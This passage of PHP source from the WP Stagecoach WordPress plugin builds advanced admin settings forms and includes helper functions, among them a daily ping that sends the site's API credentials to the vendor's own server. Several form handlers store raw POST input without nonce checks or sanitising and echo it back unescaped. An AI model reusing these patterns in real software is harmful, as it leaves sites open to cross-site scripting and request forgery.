	echo '<div id="wpstagecoach-advanced-create-mysql-rows-per-step-form" ' . ( isset( $wpsc['advanced-create-mysql-rows-per-step'] ) ? '>' : 'style="display:none;">' );

	if( isset( $_POST['wpsc-advanced-create-mysql-rows-per-step'] ) &&
		! empty( $_POST['wpsc-advanced-create-mysql-rows-per-step'] )
	){
		$wpsc['advanced-create-mysql-rows-per-step'] = $_POST['wpsc-advanced-create-mysql-rows-per-step-number'];

		if( update_option( 'wpstagecoach', $wpsc ) !== false ) {
			_e( '<p>Custom mysql rows per step updated.</p>', 'wpstagecoach' );
		}
	}
	
	echo '<div class="wpstagecoach-warn">' . __( 'You probably shouldn\'t specify these unless you know what you are doing have been told to change them by WP Stagecoach support.', 'wpstagecoach' ) . '</div>' . PHP_EOL;
	echo '<input type="textbox" size="4" id="wpsc-advanced-create-mysql-rows-per-step-number" name="wpsc-advanced-create-mysql-rows-per-step-number" value="' . ( isset( $wpsc['advanced-create-mysql-rows-per-step'] ) ? $wpsc['advanced-create-mysql-rows-per-step']  : '10000') . '"/>';
	echo '<label for="wpsc-advanced-create-mysql-rows-per-step" />rows per step</label>';

	echo '</div>' . PHP_EOL;
}

function wpsc_advanced_display_create_mysql_custom_iterations_form() {
	/*********************************************************************************
	*	Lets user specify a custom number of iterations for database file creation   *
	*********************************************************************************/
	global $wpsc;
	echo '<div id="wpstagecoach-advanced-create-mysql-custom-iterations-form" ' . ( isset( $wpsc['advanced-create-mysql-custom-iterations'] ) ? '>' : 'style="display:none;">' );

	if( isset( $_POST['wpsc-advanced-create-mysql-custom-iterations'] ) ){
		if( isset( $_POST['wpsc-advanced-create-mysql-custom-iterations-sizes']['iterations'] ) && !empty( $_POST['wpsc-advanced-create-mysql-custom-iterations-sizes']['iterations'] ) &&
			isset( $_POST['wpsc-advanced-create-mysql-custom-iterations-sizes']['mysql_rows'] )&& !empty( $_POST['wpsc-advanced-create-mysql-custom-iterations-sizes']['mysql_rows'] )
		){
			$wpsc['advanced-create-mysql-custom-iterations-sizes']['iterations'] = $_POST['wpsc-advanced-create-mysql-custom-iterations-sizes']['iterations'];
			$wpsc['advanced-create-mysql-custom-iterations-sizes']['mysql_rows'] = $_POST['wpsc-advanced-create-mysql-custom-iterations-sizes']['mysql_rows'];

			if( update_option( 'wpstagecoach', $wpsc ) !== false ) {
				_e( '<p>Custom mysql iterations updated.</p>', 'wpstagecoach' );
			}
		} else { // tell them we need both to update
			echo '<div class="wpstagecoach-error">' . __( 'You must specify both the number of iterations and the number of mysql rows.', 'wpstagecoach' ) . '</div>' . PHP_EOL;
		}
	}
	
	echo '<div class="wpstagecoach-warn">' . __( 'You probably shouldn\'t specify these unless you know what you are doing have been told to change them by WP Stagecoach support.', 'wpstagecoach' ) . '</div>' . PHP_EOL;
	echo '<input type="textbox" size="4" id="wpsc-advanced-create-mysql-custom-iterations-sizes[mysql_rows]" name="wpsc-advanced-create-mysql-custom-iterations-sizes[mysql_rows]" value="' . ( isset( $wpsc['advanced-create-mysql-custom-iterations-sizes']['mysql_rows'] ) ? $wpsc['advanced-create-mysql-custom-iterations-sizes']['mysql_rows']  : '500') . '"/>';
	echo '<label for="wpsc-advanced-create-mysql-custom-iterations-sizes[mysql_rows]" />mysql_rows</label>';
	echo '<input type="textbox" size="4" id="wpsc-advanced-create-mysql-custom-iterations-sizes[iterations]" name="wpsc-advanced-create-mysql-custom-iterations-sizes[iterations]" value="' . ( isset( $wpsc['advanced-create-mysql-custom-iterations-sizes']['iterations'] ) ? $wpsc['advanced-create-mysql-custom-iterations-sizes']['iterations']  : '20') . '"/>';
	echo '<label for="wpsc-advanced-create-mysql-custom-iterations-sizes[iterations]" />iterations</label>';

	echo '</div>' . PHP_EOL;
}

function wpsc_advanced_display_create_mysql_tables_bypass_form() {
	/***************************************************************************
	*	Lets user select tables from database to not include in staging site   *
	***************************************************************************/
	global $wpdb;
	global $wpsc;
	$dbtables = $wpdb->get_results( 'show tables;', ARRAY_N );
	$update_wpsc = false;

	echo '<div id="wpstagecoach-advanced-create-mysql-bypass-tables-form" ' . ( isset( $wpsc['advanced-create-mysql-bypass-tables'] ) ? '>' : 'style="display:none;">' );

	echo '<div class="wpstagecoach-warn">' . __( 'Checking a table here will make WP Stagecoach NOT include it in the staging site.<br/>You shouldn\'t check anything here unless know what you are doing or have been told to check one by WP Stagecoach support.', 'wpstagecoach' ) . '</div>' . PHP_EOL;

	echo '<table><th>Bypass?</th><th>Table</th>' . PHP_EOL;
	foreach ( $dbtables as $dbtable) {

		if( isset( $_POST['wpsc-advanced-create-mysql-bypass-tables'] ) ){
			if( isset( $_POST['wpsc-advanced-create-mysql-bypass-table-list'][ $dbtable[0] ] ) &&
				! isset( $wpsc['advanced-create-mysql-bypass-table-list'][ $dbtable[0] ] )
			){ // add it to the options
				$wpsc['advanced-create-mysql-bypass-table-list'][ $dbtable[0] ] = true;
				$update_wpsc = true;
			} elseif( !isset( $_POST['wpsc-advanced-create-mysql-bypass-table-list'][ $dbtable[0] ] ) &&
				isset( $wpsc['advanced-create-mysql-bypass-table-list'][ $dbtable[0] ] )
			){ // remove it from the options
				unset( $wpsc['advanced-create-mysql-bypass-table-list'][ $dbtable[0] ] );
				$update_wpsc = true;
			}
		}

		echo '<tr><td><input type="checkbox" id="wpsc-advanced-create-mysql-bypass-table-list[' . $dbtable[0] . ']" name="wpsc-advanced-create-mysql-bypass-table-list[' . $dbtable[0] . ']"' . ( isset( $wpsc['advanced-create-mysql-bypass-table-list'][ $dbtable[0] ] ) ? ' checked ' : ' ') . '/></td>';
		echo '<td><label for="wpsc-advanced-create-mysql-bypass-table-list[' . $dbtable[0] . ']" />' . $dbtable[0] . '</label></td></tr>';
	}
	if( $update_wpsc && update_option( 'wpstagecoach', $wpsc ) !== false ) {
		_e( '<p>List of bypassed tables updated.</p>', 'wpstagecoach' );
	}
	echo '</table>' . PHP_EOL;
	echo '</div>' . PHP_EOL;
}


function wpstagecoach_check_for_hhvm() {	
	/*********************************************************************************************************************************************
	*	only runs on the staging site--once a day lets the staging server know that the staging site is being actively used so it doesn't expire
	*********************************************************************************************************************************************/

	$result = phpversion();
	if( stripos( $result, 'hhvm' ) !== false ){ // we have hhvm
		return true;
	}
	$result = ini_get('hhvm.server.type');
	if( $result ){ // we probably have hhvm
		return true;
	}
	// check if phpinfo() returns HipHop
	ob_start();
	phpinfo();
	$result = ob_get_clean();
	if( strpos( $result, 'HipHop' ) !== false ||
		strpos( $result, 'HHVM' ) !== false
	){ // we probably have hhvm
		return true;
	}
	return false;
}
function wpstagecoach_staging_login_notice() {	
	/*********************************************************************************************************************************************
	*	only runs on the staging site--once a day lets the staging server know that the staging site is being actively used so it doesn't expire
	*********************************************************************************************************************************************/
	if(  !get_transient( 'wpstagecoach_staging_login_notice' ) ){
		ob_start();
		set_transient( 'wpstagecoach_staging_login_notice', true, 86400 );
		$wpsc = get_option( 'wpstagecoach' );
		$post_url = WPSTAGECOACH_CONDUCTOR . '/wpsc-staging-login.php';
		$post_details = array(
			'wpsc-user'			=> $wpsc['username'],
			'wpsc-key'			=> $wpsc['apikey'],
			'wpsc-ver'			=> WPSTAGECOACH_VERSION,
			'wpsc-stage-site'	=> $_SERVER['SERVER_NAME'],
		);
		$post_args = array(
			'timeout' => 120,
			'body' => $post_details
		);
		wp_remote_post( $post_url, $post_args );
		// also check if the user is developing a theme that might have problems with import.
		wpsc_theme_check();
		ob_clean();
	}
}

function wpsc_force_redirect( $url ){
	/*********************************************************************************
	*	forces refresh of page (to settings)
	*	requires
	*		URL of where we're going
	*	return value:
	*		none
	*********************************************************************************/
	echo '<p>' . __( 'redirecting...', 'wpstagecoach' ) . '</p>'.PHP_EOL;
	echo '<form style="display: hidden"  method="POST" action="' . get_admin_url() . $url . '" id="wpsc-refresh">';
	echo '<input type="hidden" name="wpstagecoach-settings-updated" value="true"/>';
	echo '</form>';
	echo '<script>';
	echo 'document.forms["wpsc-refresh"].submit();';
	echo '</script>';
}

function wpsc_size_suffix( $size ){
	/*********************************************************************************
	*	outputs a size + suffix for a given size in bytes
	*	requires
	*		a size (int)
	*	return value:
	*		a size + the appropriate suffix
	*********************************************************************************/
	$sizes = array( 'B', 'KB', 'MB', 'GB', 'TB' );
	$i=0;
	while( $size > 1024 ){
		$i++;
		$size = $size / 1024;
	}
	return (int)$size . $sizes[ $i ];
}

function wpsc_get_dir_size( $dir ){
	/*********************************************************************************
	*	Gets the size of all the files and dirs in dir
	*	requires
	*		$dir to work on
	*	return value:
	*		size of all the files & dirs in that dir
	*********************************************************************************/
	$total = 0;
	foreach ( scandir( $dir ) as $file ){
		if( $file != '.' && $file != '..' ){
			if( is_dir( $dir . '/' . $file ) && !is_link( $dir . '/' . $file ) ){
				$total += wpsc_get_dir_size( $dir . '/' . $file );
			} else {
				$total += filesize( $dir . '/' . $file );
			}
		}
	}
	return $total;
}

